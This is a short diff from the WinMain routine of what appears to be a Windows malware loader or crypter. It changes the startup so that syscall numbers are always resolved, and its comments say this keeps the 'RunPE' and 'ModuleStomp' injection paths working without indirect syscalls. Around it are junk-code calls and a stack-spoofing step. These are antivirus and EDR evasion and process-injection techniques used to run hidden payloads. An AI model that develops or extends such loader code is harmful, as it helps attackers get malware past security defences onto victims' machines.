@@ -225,11 +225,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
     JUNK_CODE();
 
-    // ── Step 1b: Scan for indirect syscall gadgets ──
+    // ── Step 1b: Scan for indirect syscall gadgets + resolve SSNs ──
+    // GadgetPool (Tier 1) only when IndirectSyscalls enabled.
+    // Syscall::Init always runs — resolves SSNs for Tier 3 fallback
+    // so RunPE/ModuleStomp work even without IndirectSyscalls.
     if (GlobalConfig.bIndirectSyscalls) {
         GadgetPool::Scan();
-        Syscall::Init();
     }
+    Syscall::Init();
     JUNK_CODE();
 
     // ── Step 1c: Initialize Stack Spoofing ──
